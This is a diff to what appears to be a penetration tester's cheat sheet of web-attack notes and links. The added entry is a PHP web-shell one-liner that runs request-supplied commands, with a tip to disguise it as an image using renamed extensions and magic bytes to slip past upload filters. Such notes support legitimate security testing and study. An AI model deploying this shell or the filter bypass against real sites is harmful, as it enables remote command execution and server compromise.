@@ -354,10 +354,12 @@ https://0xayub.gitbook.io/blog/
 ### file upload bypass
 https://book.hacktricks.xyz/pentesting-web/file-upload
 
-### php code
+### creating an image php payload (rename x.php to x.png,x.jpg etc). You may need to use magic bytes.
 ```
-system($_REQUEST['key']);
+<?php system($_REQUEST["cmd"]); ?>
 ```
+https://en.wikipedia.org/wiki/List_of_file_signatures
+
 ### LateX injection
 https://0day.work/hacking-with-latex/  
 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection  
